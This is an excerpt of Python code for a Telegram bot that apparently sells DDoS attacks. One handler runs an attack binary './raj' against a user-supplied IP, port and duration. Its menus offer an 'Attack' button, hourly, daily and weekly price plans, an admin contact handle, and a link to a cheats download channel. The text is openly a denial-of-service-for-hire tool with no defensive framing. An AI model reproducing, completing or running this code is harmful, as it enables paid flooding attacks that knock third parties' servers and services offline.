...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    command = f"./raj {target_ip} {target_port} {duration} 40"
    try:
...
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @VIPXDDOS_ADMIN"
...
def send_welcome(message):
    ...
    btn_plan = KeyboardButton("Plan🤑")
    btn_canary = KeyboardButton("Canary Download✔️")  # New Canary button
    markup.add(btn_attack, btn_account, btn_support, btn_plan, btn_canary)
...
# Handle messages
# Handle messages
# Modify the message handler to handle "Plan🤑"
...
def echo_message(message):
    try:
        if message.text == "Attack 🚀":
            ...
            bot.send_message(message.chat.id, "Contact Administrator @VIPXDDOS_ADMIN")
        elif message.text == "Plan🤑":
            plan_message = (
                "❤️‍🔥 BROTHER POWERFUL PLAN ❤️‍🔥\n\n"
                "👌 PRICE LIST👇👇\n\n"
                "✅ 1 Hr ⚡️ 30/- FIXX\n"
                "✅ 1 Day ⚡️ 90/- FIXX\n"
                "✅ Week ⚡️ 300/- FIXX\n"
        ...
        elif message.text == "Canary Download✔️":  # Handle the new Canary button
            bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/vipcheatsrajddos/144")
        else:
